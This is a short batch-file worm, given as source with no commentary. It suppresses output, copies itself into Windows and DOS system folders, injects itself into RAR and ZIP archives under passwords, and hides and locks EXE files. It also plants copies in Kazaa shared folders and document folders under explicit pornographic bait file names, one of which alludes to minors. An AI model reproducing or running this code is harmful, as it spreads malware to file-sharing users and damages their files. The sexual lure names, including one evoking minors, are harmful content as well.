   @echo off
   if "%1=="#r goto RaRO
   if "%1=="#z goto ZiPP
   ctty nul
   goto DOS
   :DOS
   copy %0 c:\dos\%0
   goto WIN9x
   :WIN9x
   copy %0 c:\windows\%0
   copy %0 c:\Win98\%0
   copy %0 c:\WinXP\%0
   copy %0 c:\win95\%0
   goto WIN32
   :WIN32
   copy %0 c:\Win2000\%0
   copy %0 c:\Win2K\%0
   goto Otros
   :Otros
   copy %0 c:\%0
   copy %0 ..\%0
   ctty con
   for %%r in (*.rar) do call %0 #r %%r
   for %%x in (*.exe) do attrib +s +h +r %%x
   for %%z in (*.zip) do call %0 #z %%z
   goto end
   :RaRO
   attrib -r %2
   rar a -tk -y -c- -o+ -pRARMENOW %2 %0 >nul
   goto end
   :ZiPP
   attrib -r %2
   pkzip -sZIPMENOW %2 %0 >nul
   goto end
   :end
   :P2P
   copy %0 "c:\Archivos de pograma\Kazaa\My Shared Folder\Mature_Girl_Fuckin_And_Sucking.WMV.bat"
   copy %0 "c:\Archivos de pograma\Kazaa\My Shared Folder\Blondes_Bitches.MPEG.bat"
   copy %0 "c:\Archivos de pograma\Kazaa\My Shared Folder\Lolitas.Nudes.MPG.bat"
   copy %0 "c:\Archivos de pograma\Kazaa\My Shared Folder\Anal_Double_Penetration.AVI.bat"
   copy %0 "c:\Archivos de pograma\Kazaa\My Shared Folder\Oral_Bukkake.JPG.bat"
   copy %0 "c:\Program Files\Kazaa\My Shared Folder\Mature_Girl_Fuckin_And_Sucking.WMV.bat"
   copy %0 "c:\Program Files\Kazaa\My Shared Folder\Blondes_Bitches.MPEG.bat"
   copy %0 "c:\Program Files\Kazaa\My Shared Folder\Lolitas.Nudes.MPG.bat"
   copy %0 "c:\Program Files\Kazaa\My Shared Folder\Anal_Double_Penetration.AVI.bat"
   copy %0 "c:\Program Files\Kazaa\My Shared Folder\Oral_Bukkake.JPG.bat"
   copy %0 "c:\My Documents\Mature_Girl_Fuckin_And_Sucking.WMV.bat"
   copy %0 "c:\My Documents\Blondes_Bitches.MPEG.bat"
   copy %0 "c:\My Documents\Lolitas.Nudes.MPG.bat"
   copy %0 "c:\My Documents\Anal_Double_Penetration.AVI.bat"
   copy %0 "c:\My Documents\Oral_Bukkake.JPG.bat"
   copy %0 "c:\Mis Documentos\Mature_Girl_Fuckin_And_Sucking.WMV.bat"
   copy %0 "c:\Mis Documentos\Blondes_Bitches.MPEG.bat"
   copy %0 "c:\Mis Documentos\Lolitas.Nudes.MPG.bat"
   copy %0 "c:\Mis Documentos\Anal_Double_Penetration.AVI.bat"
   copy %0 "c:\Mis Documentos\Oral_Bukkake.JPG.bat"
   echo on
